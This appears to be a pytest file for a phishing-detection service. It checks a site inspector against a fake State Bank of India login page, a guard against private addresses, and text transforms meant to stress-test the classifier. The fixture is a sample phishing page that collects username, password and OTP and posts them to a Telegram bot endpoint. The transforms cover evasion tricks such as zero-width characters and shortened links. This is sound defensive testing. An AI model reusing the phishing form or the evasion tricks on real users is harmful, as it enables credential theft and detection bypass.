import random

from fastapi.testclient import TestClient

from app.analyzer import site_inspect
from app.main import app
from scripts import stress_test

FAKE_SBI = """<html><head><title>SBI Online - Login</title></head><body oncontextmenu="return false">
<img src="https://www.onlinesbi.sbi/images/logo.png" alt="State Bank of India">
<h1>SBI KYC Update</h1>
<form action="https://api.telegram.org/bot123/sendMessage" method="post">
  <input name="username"><input type="password" name="pass"><input name="otp" placeholder="Enter OTP">
</form>
<a href="#">Home</a><a href="#">About</a><a href="#">Help</a><a href="#">Contact</a><a href="javascript:void(0)">FAQ</a>
</body></html>"""


def test_fake_bank_login_page_is_high_risk():
    r = site_inspect.analyse_html("https://sbi-kyc-update.xyz/login", FAKE_SBI)
    ids = {f["id"] for f in r["findings"]}
    assert r["level"] == "high"
    assert {"site_brand_impersonation", "site_sensitive_form", "site_form_exfil", "site_hotlinks_brand", "site_dead_links"} <= ids
    assert "OTP" in r["page"]["sensitive_fields"]


def test_official_bank_page_is_low_risk():
    r = site_inspect.analyse_html("https://www.onlinesbi.sbi/", FAKE_SBI.replace("https://api.telegram.org/bot123/sendMessage", "/login"))
    assert r["level"] == "low"
    assert any(f["id"] == "site_official" for f in r["findings"])


def test_inspector_refuses_private_addresses():
    r = site_inspect.inspect("http://127.0.0.1:8000/")
    assert r["level"] == "unknown" and "non-public" in r["error"]


def test_inspect_endpoint_validates_input():
    c = TestClient(app)
    assert c.post("/api/inspect-site", json={"url": "two words here"}).status_code == 422
    r = c.post("/api/inspect-site", json={"url": "http://localhost/"})
    assert r.status_code == 200 and r.json()["level"] == "unknown"


def test_robustness_endpoint_serves_utf8_report(tmp_path, monkeypatch):
    from app import features
    path = tmp_path / "robustness.json"
    path.write_text('{"transforms": [{"name": "аccount → bl0cked"}]}', encoding="utf-8")
    monkeypatch.setattr(features, "ROBUSTNESS", path)
    r = TestClient(app).get("/api/robustness")
    assert r.status_code == 200 and r.json()["transforms"][0]["name"] == "аccount → bl0cked"


def test_stress_transforms_keep_links_and_change_text():
    text = "Your SBI account is blocked. Update KYC at http://sbi-kyc.xyz/login today"
    rng = random.Random(1)
    assert "http://sbi-kyc.xyz/login" in stress_test.zero_width(text, rng)
    assert "\u200b" in stress_test.zero_width(text, rng)
    assert "hxxp://sbi-kyc[.]xyz/login" in stress_test.defanged_links(text, rng)
    assert "bit.ly/" in stress_test.shortened_links(text, rng)
    assert "deactivated" in stress_test.reworded(text, rng)
    assert stress_test.moved_to_free_host(text, rng) != text
